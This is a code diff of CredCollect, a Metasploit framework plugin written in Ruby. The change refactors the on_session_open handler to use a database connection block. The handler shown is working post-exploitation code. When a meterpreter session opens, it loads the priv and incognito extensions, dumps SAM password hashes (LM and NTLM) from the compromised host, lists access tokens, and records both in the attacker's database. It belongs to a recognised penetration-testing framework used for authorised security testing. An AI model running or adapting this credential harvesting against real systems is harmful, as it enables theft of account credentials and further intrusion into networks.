@@ -39,57 +39,56 @@ class Plugin::CredCollect < Msf::Plugin
 
 	end
 
-	def on_session_open(session)
+  def on_session_open(session)
+    framework.db.with_connection do
+      print_status("This is CredCollect, I have the conn!")
 
-		return if not self.framework.db.active
+      if (session.type == "meterpreter")
 
-		print_status("This is CredCollect, I have the conn!")
+        # Make sure we're rockin Priv and Incognito
+        session.core.use("priv")
+        session.core.use("incognito")
 
-		if (session.type == "meterpreter")
+        # It wasn't me mom! Stinko did it!
+        hashes = session.priv.sam_hashes
 
-			# Make sure we're rockin Priv and Incognito
-			session.core.use("priv")
-			session.core.use("incognito")
+        # Target infos for the db record
+        addr = session.sock.peerhost
+        # This ought to read from the exploit's datastore.
+        # Use the meterpreter script if you need to control it.
+        smb_port = 445
 
-			# It wasn't me mom! Stinko did it!
-			hashes = session.priv.sam_hashes
+        # Record hashes to the running db instance
+        hashes.each do |hash|
+          data = {}
+          data[:host]  = addr
+          data[:port]  = smb_port
+          data[:sname] = 'smb'
+          data[:user]  = hash.user_name
+          data[:pass]  = hash.lanman + ":" + hash.ntlm
+          data[:type]  = "smb_hash"
+          data[:active] = true
 
-			# Target infos for the db record
-			addr = session.sock.peerhost
-			# This ought to read from the exploit's datastore.
-			# Use the meterpreter script if you need to control it.
-			smb_port = 445
+          self.framework.db.report_auth_info(data)
+        end
 
-			# Record hashes to the running db instance
-			hashes.each do |hash|
-				data = {}
-				data[:host]  = addr
-				data[:port]  = smb_port
-				data[:sname] = 'smb'
-				data[:user]  = hash.user_name
-				data[:pass]  = hash.lanman + ":" + hash.ntlm
-				data[:type]  = "smb_hash"
-				data[:active] = true
+        # Record user tokens
+        tokens = session.incognito.incognito_list_tokens(0).values
+        # Meh, tokens come to us as a formatted string
+        tokens = tokens.join.strip!.split("\n")
 
-				self.framework.db.report_auth_info(data)
-			end
+        tokens.each do |token|
+          data = {}
+          data[:host]      = addr
+          data[:type]      = 'smb_token'
+          data[:data]      = token
+          data[:update]    = :unique_data
 
-			# Record user tokens
-			tokens = session.incognito.incognito_list_tokens(0).values
-			# Meh, tokens come to us as a formatted string
-			tokens = tokens.join.strip!.split("\n")
-
-			tokens.each do |token|
-				data = {}
-				data[:host]      = addr
-				data[:type]      = 'smb_token'
-				data[:data]      = token
-				data[:update]    = :unique_data
-
-				self.framework.db.report_note(data)
-			end
-		end
-	end
+          self.framework.db.report_note(data)
+        end
+      end
+    end
+  end
 
 	def on_session_close(session,reason='')
 	end
